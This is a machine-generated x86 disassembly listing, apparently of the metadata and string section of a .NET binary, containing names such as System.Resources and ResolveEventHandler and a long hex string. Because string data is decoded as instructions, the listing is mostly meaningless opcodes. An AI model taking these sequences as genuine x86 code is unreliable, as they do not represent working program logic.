  402769:	gs ins DWORD PTR es:[edi],dx
  40276b:	cs push edx
  40276d:	jne    0x4027dd
  40276f:	je     0x4027da
  402771:	ins    DWORD PTR es:[edi],dx
  402772:	gs cs inc ebx
  402775:	outs   dx,DWORD PTR ds:[esi]
  402776:	ins    DWORD PTR es:[edi],dx
  402777:	jo     0x4027e2
  402779:	ins    BYTE PTR es:[edi],dx
  40277a:	gs jb  0x4027d0
  40277d:	gs jb  0x4027f6
  402780:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  402787:	outs   dx,BYTE PTR ds:[esi]
  402788:	je     0x4027f3
  40278a:	ins    DWORD PTR es:[edi],dx
  40278b:	gs inc ebx
  40278d:	outs   dx,DWORD PTR ds:[esi]
  40278e:	ins    DWORD PTR es:[edi],dx
  40278f:	jo     0x4027f2
  402791:	je     0x4027fc
  402793:	bound  ebp,QWORD PTR [ecx+0x6c]
  402796:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  40279e:	bound  esi,QWORD PTR [ebp+0x74]
  4027a1:	add    BYTE PTR gs:[ebx+0x79],dl
  4027a5:	jae    0x40281b
  4027a7:	gs ins DWORD PTR es:[edi],dx
  4027a9:	cs inc esp
  4027ab:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  4027b2:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  4027b9:	jne    0x402822
  4027bb:	addr16 popa 
  4027bd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  4027c1:	je     0x402837
  4027c3:	jb     0x40282e
  4027c5:	bound  esi,QWORD PTR [ebp+0x74]
  4027c8:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4027cd:	jne    0x402836
  4027cf:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  4027d7:	jae    0x4027d9
  4027d9:	inc    ebx
  4027da:	outs   dx,DWORD PTR ds:[esi]
  4027db:	ins    DWORD PTR es:[edi],dx
  4027dc:	jo     0x402847
  4027de:	ins    BYTE PTR es:[edi],dx
  4027df:	popa   
  4027e0:	je     0x40284b
  4027e2:	outs   dx,DWORD PTR ds:[esi]
  4027e3:	outs   dx,BYTE PTR ds:[esi]
  4027e4:	push   edx
  4027e5:	gs ins BYTE PTR es:[edi],dx
  4027e7:	popa   
  4027e8:	js     0x40284b
  4027ea:	je     0x402855
  4027ec:	outs   dx,DWORD PTR ds:[esi]
  4027ed:	outs   dx,BYTE PTR ds:[esi]
  4027ee:	jae    0x402831
  4027f0:	je     0x402866
  4027f2:	jb     0x40285d
  4027f4:	bound  esi,QWORD PTR [ebp+0x74]
  4027f7:	add    BYTE PTR gs:[esp+esi*1+0x56],dl
  4027fc:	push   ebx
  4027fd:	dec    eax
  4027fe:	outs   dx,DWORD PTR ds:[esi]
  4027ff:	jae    0x402875
  402801:	push   eax
  402802:	jb     0x402873
  402804:	arpl   WORD PTR [ebp+0x73],sp
  402807:	jae    0x402809
  402809:	inc    ecx
  40280a:	jb     0x402873
  40280c:	jne    0x40287b
  40280e:	outs   dx,BYTE PTR gs:[esi]
  402810:	je     0x402857
  402812:	js     0x402877
  402814:	gs jo  0x40288b
  402817:	imul   ebp,DWORD PTR [edi+0x6e],0x72745300
  40281e:	imul   ebp,DWORD PTR [esi+0x67],0x6e6f4300
  402825:	arpl   WORD PTR [ecx+0x74],sp
  402828:	add    BYTE PTR [ebp+0x69],cl
  40282b:	arpl   WORD PTR [edx+0x6f],si
  40282e:	jae    0x40289f
  402830:	data16 je 0x402861
  402833:	push   esi
  402834:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40283b:	jne    0x4028a1
  40283d:	imul   ebp,DWORD PTR [edi+0x2e],0x74786554
  402844:	push   esp
  402845:	gs ins DWORD PTR es:[edi],dx
  402847:	jo     0x4028b5
  402849:	popa   
  40284a:	je     0x4028b5
  40284c:	outs   dx,BYTE PTR ds:[esi]
  40284d:	addr16 cs push esi
  402850:	push   ebx
  402851:	dec    eax
  402852:	outs   dx,DWORD PTR ds:[esi]
  402853:	jae    0x4028c9
  402855:	xor    DWORD PTR cs:[ecx],esi
  402858:	xor    BYTE PTR cs:[eax],al
  40285b:	dec    ebp
  40285c:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402863:	je     0x402893
  402865:	push   esi
  402866:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40286d:	jne    0x4028d3
  40286f:	imul   ebp,DWORD PTR [edi+0x2e],0x74786554
  402876:	push   esp
  402877:	gs ins DWORD PTR es:[edi],dx
  402879:	jo     0x4028e7
  40287b:	popa   
  40287c:	je     0x4028e7
  40287e:	outs   dx,BYTE PTR ds:[esi]
  40287f:	addr16 cs push esi
  402882:	push   ebx
  402883:	dec    eax
  402884:	outs   dx,DWORD PTR ds:[esi]
  402885:	jae    0x4028fb
  402887:	add    BYTE PTR [edx+esi*2+0x61],dl
  40288b:	outs   dx,BYTE PTR ds:[esi]
  40288c:	jae    0x4028f4
  40288e:	outs   dx,DWORD PTR ds:[esi]
  40288f:	jb     0x4028fe
  402891:	popa   
  402892:	je     0x4028fd
  402894:	outs   dx,DWORD PTR ds:[esi]
  402895:	outs   dx,BYTE PTR ds:[esi]
  402896:	push   edx
  402897:	jne    0x402907
  402899:	inc    esi
  40289a:	popa   
  40289b:	arpl   WORD PTR [edi+ebp*2+0x72],si
  40289f:	jns    0x4028a1
  4028a1:	push   edx
  4028a2:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x70497265
  4028ab:	arpl   WORD PTR [ebx+0x68],ax
  4028ae:	popa   
  4028af:	outs   dx,BYTE PTR ds:[esi]
  4028b0:	outs   dx,BYTE PTR ds:[esi]
  4028b1:	gs ins BYTE PTR es:[edi],dx
  4028b3:	add    BYTE PTR [ecx+edi*2+0x70],dl
  4028b7:	add    BYTE PTR gs:[edx+0x75],dl
  4028bb:	outs   dx,BYTE PTR ds:[esi]
  4028bc:	je     0x402927
  4028be:	ins    DWORD PTR es:[edi],dx
  4028bf:	gs push esp
  4028c1:	jns    0x402933
  4028c3:	gs dec eax
  4028c5:	popa   
  4028c6:	outs   dx,BYTE PTR ds:[esi]
  4028c7:	fs ins BYTE PTR es:[edi],dx
  4028c9:	add    BYTE PTR gs:[edi+0x65],al
  4028cd:	je     0x402923
  4028cf:	jns    0x402941
  4028d1:	gs inc esi
  4028d3:	jb     0x402944
  4028d5:	ins    DWORD PTR es:[edi],dx
  4028d6:	dec    eax
  4028d7:	popa   
  4028d8:	outs   dx,BYTE PTR ds:[esi]
  4028d9:	fs ins BYTE PTR es:[edi],dx
  4028db:	add    BYTE PTR gs:[ebx+0x79],dl
  4028df:	jae    0x402955
  4028e1:	gs ins DWORD PTR es:[edi],dx
  4028e3:	cs push edx
  4028e5:	jne    0x402955
  4028e7:	je     0x402952
  4028e9:	ins    DWORD PTR es:[edi],dx
  4028ea:	gs cs push edx
  4028ed:	gs ins DWORD PTR es:[edi],dx
  4028ef:	outs   dx,DWORD PTR ds:[esi]
  4028f0:	je     0x40295b
  4028f2:	outs   dx,BYTE PTR ds:[esi]
  4028f3:	add    BYTE PTR [bp+si+0x65],dl
  4028f7:	ins    DWORD PTR es:[edi],dx
  4028f8:	outs   dx,DWORD PTR ds:[esi]
  4028f9:	je     0x402964
  4028fb:	outs   dx,BYTE PTR ds:[esi]
  4028fc:	addr16 inc ebx
  4028fe:	outs   dx,DWORD PTR ds:[esi]
  4028ff:	outs   dx,BYTE PTR ds:[esi]
  402900:	imul   sp,WORD PTR [edi+0x75],0x6172
  402906:	je     0x402971
  402908:	outs   dx,DWORD PTR ds:[esi]
  402909:	outs   dx,BYTE PTR ds:[esi]
  40290a:	add    BYTE PTR [edi+0x65],dl
  40290d:	ins    BYTE PTR es:[edi],dx
  40290e:	ins    BYTE PTR es:[edi],dx
  40290f:	dec    ebx
  402910:	outs   dx,BYTE PTR ds:[esi]
  402911:	outs   dx,DWORD PTR ds:[esi]
  402912:	ja     0x402982
  402914:	dec    edi
  402915:	bound  ebp,QWORD PTR [edx+0x65]
  402918:	arpl   WORD PTR [ebp+ecx*2+0x6f],si
  40291c:	fs add BYTE PTR gs:[edx+0x65],dl
  402921:	imul   esi,DWORD PTR [bp+di+0x74],0x65577265
  402929:	ins    BYTE PTR es:[edi],dx
  40292a:	ins    BYTE PTR es:[edi],dx
  40292b:	dec    ebx
  40292c:	outs   dx,BYTE PTR ds:[esi]
  40292d:	outs   dx,DWORD PTR ds:[esi]
  40292e:	ja     0x40299e
  402930:	push   ebx
  402931:	gs jb  0x4029aa
  402934:	imul   esp,DWORD PTR [ebx+0x65],0x65707954
  40293b:	add    BYTE PTR [ebx+0x79],dl
  40293e:	jae    0x4029b4
  402940:	gs ins DWORD PTR es:[edi],dx
  402942:	cs push esp
  402944:	push   0x64616572
  402949:	imul   ebp,DWORD PTR [esi+0x67],0x74754100
  402950:	outs   dx,DWORD PTR ds:[esi]
  402951:	push   edx
  402952:	gs jae 0x4029ba
  402955:	je     0x40299c
  402957:	jbe    0x4029be
  402959:	outs   dx,BYTE PTR ds:[esi]
  40295a:	je     0x40295c
  40295c:	push   edi
  40295d:	popa   
  40295e:	imul   esi,DWORD PTR [eax+ecx*2+0x61],0x656c646e
  402966:	add    BYTE PTR [edi+0x61],dl
  402969:	imul   esi,DWORD PTR [edi+ecx*2+0x6e],0x65
  402971:	cmp    DWORD PTR [esi+0x0],ecx
  402974:	outs   dx,DWORD PTR ds:[esi]
  402975:	add    BYTE PTR [eax],ah
  402977:	add    BYTE PTR [eax+0x0],dh
  40297a:	outs   dx,DWORD PTR ds:[esi]
  40297b:	add    BYTE PTR [edx+0x0],dh
  40297e:	je     0x402980
  402980:	and    BYTE PTR [eax],al
  402982:	outs   dx,BYTE PTR ds:[esi]
  402983:	add    BYTE PTR [ecx+0x0],ah
  402986:	ins    DWORD PTR es:[edi],dx
  402987:	add    BYTE PTR [ebp+0x0],ah
  40298a:	and    BYTE PTR [eax],al
  40298c:	jae    0x40298e
  40298e:	jne    0x402990
  402990:	data16 add BYTE PTR [esi+0x0],ah
  402994:	imul   eax,DWORD PTR [eax],0x200078
  40299a:	jae    0x40299c
  40299c:	jne    0x40299e
  40299e:	jo     0x4029a0
  4029a0:	jo     0x4029a2
  4029a2:	ins    BYTE PTR es:[edi],dx
  4029a3:	add    BYTE PTR [ecx+0x0],ch
  4029a6:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  4029ab:	aas    
  4029ac:	push   esp
  4029ad:	add    BYTE PTR [edx+0x0],dh
  4029b0:	popa   
  4029b1:	add    BYTE PTR [esi+0x0],ch
  4029b4:	jae    0x4029b6
  4029b6:	data16 add BYTE PTR [edi+0x0],ch
  4029ba:	jb     0x4029bc
  4029bc:	ins    DWORD PTR es:[edi],dx
  4029bd:	add    BYTE PTR [ecx+0x0],ah
  4029c0:	je     0x4029c2
  4029c2:	imul   eax,DWORD PTR [eax],0x6e006f
  4029c8:	push   edx
  4029c9:	add    BYTE PTR [ebp+0x0],dh
  4029cc:	outs   dx,BYTE PTR ds:[esi]
  4029cd:	add    BYTE PTR [esi+0x0],al
  4029d0:	popa   
  4029d1:	add    BYTE PTR [ebx+0x0],ah
  4029d4:	je     0x4029d6
  4029d6:	outs   dx,DWORD PTR ds:[esi]
  4029d7:	add    BYTE PTR [edx+0x0],dh
  4029da:	jns    0x4029dc
  4029dc:	push   ebx
  4029dd:	add    BYTE PTR [ebp+0x0],ah
  4029e0:	jb     0x4029e2
  4029e2:	jbe    0x4029e4
  4029e4:	imul   eax,DWORD PTR [eax],0x650063
  4029ea:	add    BYTE PTR [ecx],dh
  4029ec:	push   esp
  4029ed:	add    BYTE PTR [edx+0x0],dh
  4029f0:	popa   
  4029f1:	add    BYTE PTR [esi+0x0],ch
  4029f4:	jae    0x4029f6
  4029f6:	data16 add BYTE PTR [edi+0x0],ch
  4029fa:	jb     0x4029fc
  4029fc:	ins    DWORD PTR es:[edi],dx
  4029fd:	add    BYTE PTR [ecx+0x0],ah
  402a00:	je     0x402a02
  402a02:	imul   eax,DWORD PTR [eax],0x6e006f
  402a08:	push   edx
  402a09:	add    BYTE PTR [ebp+0x0],dh
  402a0c:	outs   dx,BYTE PTR ds:[esi]
  402a0d:	add    BYTE PTR [esi+0x0],al
  402a10:	popa   
  402a11:	add    BYTE PTR [ebx+0x0],ah
  402a14:	je     0x402a16
  402a16:	outs   dx,DWORD PTR ds:[esi]
  402a17:	add    BYTE PTR [edx+0x0],dh
  402a1a:	jns    0x402a1c
  402a1c:	add    BYTE PTR [eax],al
  402a1e:	add    BYTE PTR [eax],al
  402a20:	pop    eax
  402a21:	ins    DWORD PTR es:[edi],dx
  402a22:	jb     0x402a69
  402a24:	mov    esp,?
  402a26:	mov    ebx,0x7946b84b
  402a2b:	fcom   st(5)
  402a2d:	lea    ebx,[ebx-0x48f7ff80]
  402a33:	jp     0x402a91
  402a35:	push   esi
  402a36:	sbb    DWORD PTR [eax+eiz*8],esi
  402a39:	mov    DWORD PTR ds:0x1d010100,eax
  402a3f:	push   cs
  402a40:	add    esp,DWORD PTR [eax]
  402a42:	add    BYTE PTR [ecx],al
  402a44:	add    al,0x20
  402a46:	add    DWORD PTR [ecx],eax
  402a48:	push   cs
  402a49:	add    al,0x20
  402a4b:	add    DWORD PTR [ecx],eax
  402a4d:	add    al,BYTE PTR ds:0xe010220
  402a53:	push   cs
  402a54:	add    eax,0x11010120
  402a59:	push   ebp
  402a5a:	add    al,0x20
  402a5c:	add    DWORD PTR [ecx],eax
  402a5e:	or     BYTE PTR [eax+0x2400a0],al
  402a64:	add    BYTE PTR [eax+eax*4],al
  402a67:	add    BYTE PTR [eax],al
  402a69:	xchg   esp,eax
  402a6a:	add    BYTE PTR [eax],al
  402a6c:	add    BYTE PTR [esi],al
  402a6e:	add    al,BYTE PTR [eax]
  402a70:	add    BYTE PTR [eax],al
  402a72:	and    al,0x0
  402a74:	add    BYTE PTR [edx+0x53],dl
  402a77:	inc    ecx
  402a78:	xor    DWORD PTR [eax],eax
  402a7a:	add    al,0x0
  402a7c:	add    BYTE PTR [ecx],al
  402a7e:	add    BYTE PTR [ecx],al
  402a80:	add    BYTE PTR [edi],al
  402a82:	sar    edx,1
  402a84:	push   edi
  402a85:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  402a8b:	test   BYTE PTR [edx+0xdfdae0f],ch
  402a91:	jmp    0xecab287e
  402a96:	pop    DWORD PTR [edi+0x6c7603fb]
  402a9c:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  402aa1:	mov    dl,0x3b
  402aa3:	out    0x9a,eax
  402aa5:	(bad)  
  402aa7:	fadd   st(1),st
  402aa9:	fstp   QWORD PTR [edx+0x211336d2]
  402aaf:	add    dl,BYTE PTR [eax-0x6c38df5]
  402ab5:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  402abc:	pop    esi
  402abe:	pop    es
  402abf:	ja     0x402b10
  402ac1:	sub    eax,ebp
  402ac3:	xor    cl,BYTE PTR [esi]
  402ac5:	xchg   edx,eax
  402ac6:	jmp    0xc021:0xe8e4ec05
  402acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ace:	out    dx,eax
  402acf:	call   0x4c9c8fc5
  402ad4:	or     al,0x93
  402ad6:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  402add:	stos   BYTE PTR es:[edi],al
  402ade:	gs sub al,0x1d
  402ae1:	cli    
  402ae2:	(bad)  
  402ae3:	cmp    eax,0x2d6f5d74
  402ae8:	in     eax,0xf1
  402aea:	jle    0x402b4a
  402aec:	scas   eax,DWORD PTR es:[edi]
  402aed:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  402af5:	inc    ebx
  402af6:	sbb    BYTE PTR gs:[eax],ah
  402af9:	ins    DWORD PTR es:[edi],dx
  402afa:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  402b01:	add    eax,0xe0e0200
  402b06:	push   cs
  402b07:	or     BYTE PTR [eax+0x117f5f3f],dh
  402b0d:	aad    0xa
  402b0f:	cmp    al,BYTE PTR [eax+eax*1]
  402b12:	add    DWORD PTR [ecx],eax
  402b14:	push   cs
  402b15:	push   es
  402b16:	add    BYTE PTR [ecx],al
  402b18:	adc    ch,BYTE PTR [ecx+0x11]
  402b1b:	ins    DWORD PTR es:[edi],dx
  402b1c:	or     BYTE PTR [eax],al
  402b1e:	add    eax,DWORD PTR [ecx]
  402b20:	adc    ch,BYTE PTR [ecx+0xe]
  402b23:	adc    DWORD PTR [ebp+0x3],esi
  402b26:	and    BYTE PTR [eax],al
  402b28:	add    al,BYTE PTR ds:0x120e0207
  402b2e:	jge    0x402b67
  402b30:	add    DWORD PTR [eax],eax
  402b32:	sbb    ch,BYTE PTR [esi]
  402b34:	dec    esi
  402b35:	inc    ebp
  402b36:	push   esp
  402b37:	inc    esi
  402b38:	jb     0x402b9b
  402b3a:	ins    DWORD PTR es:[edi],dx
  402b3b:	gs ja  0x402bad
  402b3e:	jb     0x402bab
  402b40:	sub    al,0x56
  402b42:	gs jb  0x402bb8
  402b45:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  402b4c:	xor    eax,0xe540001
  402b51:	adc    al,0x46
  402b53:	jb     0x402bb6
  402b55:	ins    DWORD PTR es:[edi],dx
  402b56:	gs ja  0x402bc8
  402b59:	jb     0x402bc6
  402b5b:	inc    esp
  402b5c:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  402b63:	popa   
  402b64:	ins    DWORD PTR es:[edi],dx
  402b65:	add    BYTE PTR gs:0x1,al
  402b6c:	add    BYTE PTR [eax],bl
  402b6e:	add    DWORD PTR [eax],eax
  402b70:	adc    edx,DWORD PTR [esp+esi*1+0x56]
  402b74:	push   ebx
  402b75:	dec    eax
  402b76:	outs   dx,DWORD PTR ds:[esi]
  402b77:	jae    0x402bed
  402b79:	push   eax
  402b7a:	jb     0x402beb
  402b7c:	arpl   WORD PTR [ebp+0x73],sp
  402b7f:	jae    0x402baf
  402b81:	gs js  0x402be9
  402b84:	add    BYTE PTR [eax],al
  402b86:	sbb    al,BYTE PTR [ecx]
  402b88:	add    BYTE PTR ds:0x7263694d,dl
  402b8e:	outs   dx,DWORD PTR ds:[esi]
  402b8f:	jae    0x402c00
  402b91:	data16 je 0x402bb4
  402b94:	inc    ebx
  402b95:	outs   dx,DWORD PTR ds:[esi]
  402b96:	jb     0x402c08
  402b98:	outs   dx,DWORD PTR ds:[esi]
  402b99:	jb     0x402bfc
  402b9b:	je     0x402c06
  402b9d:	outs   dx,DWORD PTR ds:[esi]
  402b9e:	outs   dx,BYTE PTR ds:[esi]
  402b9f:	add    BYTE PTR [eax],al
  402ba1:	and    eax,0x4d200001
  402ba6:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402bad:	je     0x402b71
  402baf:	scas   al,BYTE PTR es:[edi]
  402bb0:	and    BYTE PTR [esi+0x69],dl
  402bb3:	jae    0x402c2a
  402bb5:	popa   
  402bb6:	ins    BYTE PTR es:[edi],dx
  402bb7:	and    BYTE PTR [ebx+0x74],dl
  402bba:	jne    0x402c20
  402bbc:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  402bc3:	xor    DWORD PTR [edx],esi
  402bc5:	add    BYTE PTR [eax],al
  402bc7:	xor    eax,DWORD PTR [ecx]
  402bc9:	add    BYTE PTR [esi],ch
  402bcb:	ret    0x20a9
  402bce:	dec    ebp
  402bcf:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402bd6:	je     0x402bf8
  402bd8:	inc    ebx
  402bd9:	outs   dx,DWORD PTR ds:[esi]
  402bda:	jb     0x402c4c
  402bdc:	outs   dx,DWORD PTR ds:[esi]
  402bdd:	jb     0x402c40
  402bdf:	je     0x402c4a
  402be1:	outs   dx,DWORD PTR ds:[esi]
  402be2:	outs   dx,BYTE PTR ds:[esi]
  402be3:	and    BYTE PTR cs:[ecx+0x6c],al
  402be7:	ins    BYTE PTR es:[edi],dx
  402be8:	and    BYTE PTR [edx+0x69],dh
  402beb:	addr16 push 0x72207374
  402bf1:	gs jae 0x402c59
  402bf4:	jb     0x402c6c
  402bf6:	gs fs add BYTE PTR cs:[eax],al
  402bfb:	adc    DWORD PTR [ecx],eax
  402bfd:	add    BYTE PTR [ecx+esi*1],cl
  402c00:	xor    DWORD PTR [esi],ebp
  402c02:	xor    BYTE PTR [esi],ch
  402c04:	xor    eax,0x37323730
  402c09:	xor    DWORD PTR cs:[eax],eax
  402c0c:	add    BYTE PTR ds:0x31080001,cl
  402c12:	xor    DWORD PTR [esi],ebp
  402c14:	xor    BYTE PTR [esi],ch
  402c16:	xor    BYTE PTR [esi],ch
  402c18:	xor    BYTE PTR [eax],al
  402c1a:	add    BYTE PTR [edx],cl
  402c1c:	add    DWORD PTR [eax],eax
  402c1e:	add    eax,0x552d6e65
  402c23:	push   ebx
  402c24:	add    BYTE PTR [eax],al
  402c26:	add    eax,0x10001
  402c2b:	add    BYTE PTR [edx],ch
  402c2d:	add    DWORD PTR [eax],eax
  402c2f:	and    eax,0x645c3a46
  402c34:	fs pop esp
  402c36:	je     0x402ca7
  402c38:	outs   dx,DWORD PTR ds:[esi]
  402c39:	ins    BYTE PTR es:[edi],dx
  402c3a:	jae    0x402c98
  402c3c:	fs gs jbe 0x402ca4
  402c40:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  402c47:	ins    BYTE PTR es:[edi],dx
  402c48:	push   eax
  402c49:	jne    0x402cad
  402c4b:	ins    BYTE PTR es:[edi],dx
  402c4c:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  402c53:	outs   dx,BYTE PTR ds:[esi]
  402c54:	imul   eax,DWORD PTR [eax],0x0
  402c57:	or     DWORD PTR [eax+0x1],0x0
  402c5b:	add    BYTE PTR [eax+0x30],0x30
  402c5f:	xor    dh,BYTE PTR [eax+esi*1]
  402c62:	xor    BYTE PTR [eax],dh
  402c64:	xor    BYTE PTR [eax],dh
  402c66:	arpl   WORD PTR [eax],di
  402c68:	xor    BYTE PTR [eax],dh
  402c6a:	xor    BYTE PTR [eax],dh
  402c6c:	xor    BYTE PTR [ecx],dh
  402c6e:	xor    al,0x30
  402c70:	xor    DWORD PTR [eax],esi
  402c72:	xor    BYTE PTR [eax],dh
  402c74:	xor    BYTE PTR [eax],dh
  402c76:	xor    BYTE PTR ss:[edx],dh
  402c79:	xor    BYTE PTR [eax],dh
  402c7b:	xor    BYTE PTR [eax],dh
  402c7d:	xor    BYTE PTR [eax],dh
  402c7f:	xor    dh,BYTE PTR [eax+esi*1]
  402c82:	xor    BYTE PTR [eax],dh
  402c84:	xor    BYTE PTR ds:0x34333532,dh
  402c8a:	xor    DWORD PTR [ebx],esi
  402c8c:	xor    DWORD PTR [eax],esi
  402c8e:	xor    BYTE PTR [eax],dh
  402c90:	cmp    BYTE PTR [eax],dh
  402c92:	xor    BYTE PTR [eax],dh
  402c94:	xor    BYTE PTR [eax],dh
  402c96:	xor    DWORD PTR [eax],esi
  402c98:	xor    BYTE PTR [eax],dh
  402c9a:	xor    DWORD PTR [eax],esi
  402c9c:	xor    BYTE PTR [esi],dh
  402c9e:	xor    DWORD PTR [ebx],esi
  402ca0:	xor    edi,DWORD PTR [ecx]
  402ca2:	cmp    DWORD PTR [ecx+0x66],esp
  402ca5:	xor    WORD PTR [eax],di
  402ca8:	xor    WORD PTR gs:[ecx+0x32],sp
  402cad:	arpl   WORD PTR [edx],si
  402caf:	xor    eax,0x32613431
  402cb4:	aaa    
  402cb5:	xor    esp,DWORD PTR [ecx+0x34]
  402cb8:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  402cbc:	xor    al,0x32
  402cbe:	bound  esi,QWORD PTR [edi]
  402cc0:	xor    dh,BYTE PTR [ebx]
  402cc2:	xor    dh,BYTE PTR [ecx]
  402cc4:	xor    WORD PTR [edi],si
  402cc7:	xor    eax,0x32303137
  402ccc:	cmp    WORD PTR fs:[ebp+0x62],sp
  402cd1:	popa   
  402cd2:	fs popa 
  402cd4:	cmp    DWORD PTR ss:[ecx],edi
  402cd7:	xor    dh,BYTE PTR [ebx]
  402cd9:	xor    dh,BYTE PTR gs:[edi]
  402cdc:	xor    edi,DWORD PTR [eax]
  402cde:	xor    al,0x30
  402ce0:	arpl   WORD PTR ss:[edx],si
  402ce3:	xor    DWORD PTR [ebp+0x35],esp
  402ce6:	bound  edi,QWORD PTR [eax]
  402ce8:	xor    BYTE PTR [ecx],dh
  402cea:	xor    eax,0x62613235
  402cef:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  402cf3:	xor    BYTE PTR [ecx+0x36],ah
  402cf6:	xor    eax,0x35333261
  402cfb:	xor    BYTE PTR gs:[eax],dh
  402cfe:	xor    DWORD PTR [ecx+0x63],esp
  402d01:	cmp    DWORD PTR [ecx+0x64],esp
  402d04:	arpl   WORD PTR [edx],si
  402d06:	xor    eax,0x38643266
  402d0b:	xor    DWORD PTR [ecx],esi
  402d0d:	bound  esi,QWORD PTR gs:[eax]
  402d10:	cmp    DWORD PTR [ecx+edi*1],esi
  402d13:	ss popa 
  402d15:	xor    al,0x63
  402d17:	ss popa 
  402d19:	xor    eax,0x36346439
  402d1e:	xor    DWORD PTR [ecx],edi
  402d20:	xor    eax,0x36633938
  402d25:	cmp    DWORD PTR [esi+0x35],esp
  402d28:	bound  esp,QWORD PTR [ecx+0x66]
  402d2b:	xor    BYTE PTR [ebx+0x34],ah
  402d2e:	xor    DWORD PTR [edi],esi
  402d30:	cmp    DWORD PTR [ecx+0x34],esp
  402d33:	aaa    
  402d34:	xor    esi,DWORD PTR [ecx]
  402d36:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  402d3a:	xor    eax,0x64633535
  402d3f:	xor    BYTE PTR [eax],dh
  402d41:	ss popa 
  402d43:	arpl   WORD PTR [ebx+0x38],sp
  402d46:	bound  esi,QWORD PTR ds:0x66393539
  402d4c:	xor    ah,BYTE PTR [edx+0x64]
  402d4f:	ss xor DWORD PTR gs:[eax],esi
  402d53:	xor    esi,DWORD PTR gs:[esi]
  402d56:	xor    BYTE PTR [ebx+0x33],ah
  402d59:	xor    al,0x35
  402d5b:	xor    esi,DWORD PTR [edi]
  402d5d:	popa   
  402d5e:	xor    DWORD PTR [edx+esi*1+0x36],esp
  402d62:	ss fs popa 
  402d65:	cmp    BYTE PTR [eax],dh
  402d67:	cmp    BYTE PTR ds:0x35363538,dh
  402d6d:	cmp    BYTE PTR [ebx],dh
  402d6f:	arpl   WORD PTR [eax],di
  402d71:	xor    eax,0x64313864
  402d76:	popa   
  402d77:	aaa    
  402d78:	xor    sp,WORD PTR [ebp+0x63]
  402d7c:	xor    BYTE PTR [ecx],dh
  402d7e:	gs cmp DWORD PTR fs:0x35633436,esi
  402d86:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  402d8a:	fs aaa 
  402d8c:	xor    DWORD PTR [ebx],esi
  402d8e:	arpl   WORD PTR [eax+esi*1+0x31],sp
  402d92:	aaa    
  402d93:	xor    ah,BYTE PTR [ebx+0x38]
  402d96:	xor    dh,BYTE PTR gs:[ebx]
  402d99:	popa   
  402d9a:	xor    DWORD PTR [eax],esi
  402d9c:	data16 xor BYTE PTR [edx],dh
  402d9f:	xor    edi,DWORD PTR [ecx]
  402da1:	bound  edi,QWORD PTR [eax]
  402da3:	xor    BYTE PTR [ebx+0x39],ah
  402da6:	bound  esi,QWORD PTR ss:[eax]
  402da9:	aaa    
  402daa:	aaa    
  402dab:	xor    esi,DWORD PTR [esi]
  402dad:	xor    ax,0x3864
  402db1:	bound  esi,QWORD PTR [eax]
  402db3:	xor    dh,BYTE PTR [edx]
  402db5:	xor    eax,0x34613234
  402dba:	gs aaa 
  402dbc:	xor    al,0x32
  402dbe:	xor    eax,0x66356131
  402dc3:	xor    al,0x33
  402dc5:	xor    bh,BYTE PTR [eax]
  402dc7:	xor    dh,BYTE PTR [ebx+esi*1]
  402dca:	xor    DWORD PTR [eax],edi
  402dcc:	bound  esi,QWORD PTR [ebx]
  402dce:	xor    eax,0x35613933
  402dd3:	popa   
  402dd4:	xor    BYTE PTR [eax],bh
  402dd6:	aaa    
  402dd7:	data16 cmp BYTE PTR [ebp+0x35],ah
  402ddb:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  402ddf:	xor    DWORD PTR [ebx],esi
  402de1:	xor    eax,0x61633966
  402de6:	xor    al,0x37
  402de8:	xor    sp,WORD PTR [edx+0x62]
  402dec:	xor    ah,BYTE PTR [ebp+0x31]
  402def:	xor    BYTE PTR [ecx+0x66],ah
  402df2:	data16 xor BYTE PTR [ecx+0x66],ah
  402df6:	xor    BYTE PTR [eax],bh
  402df8:	xor    al,0x39
  402dfa:	xor    eax,0x62663430
  402dff:	aaa    
  402e00:	arpl   WORD PTR [ebp+0x61],sp
  402e03:	xor    esp,DWORD PTR [esi+0x66]
  402e06:	xor    DWORD PTR [ecx],edi
  402e08:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  402e0c:	fs xor BYTE PTR gs:[ebp+0x64],ah
  402e11:	popa   
  402e12:	fs ss xor al,0x63
  402e16:	cmp    BYTE PTR ss:[ebp+0x66],ah
  402e1a:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  402e1f:	xor    eax,0x30336436
  402e24:	xor    ah,BYTE PTR [ecx+0x64]
  402e27:	xor    eax,0x36646635
  402e2c:	cmp    BYTE PTR gs:[eax],dh
  402e2f:	xor    si,WORD PTR [eax]
  402e32:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  402e36:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  402e3b:	cmp    DWORD PTR gs:0x38353633,esi
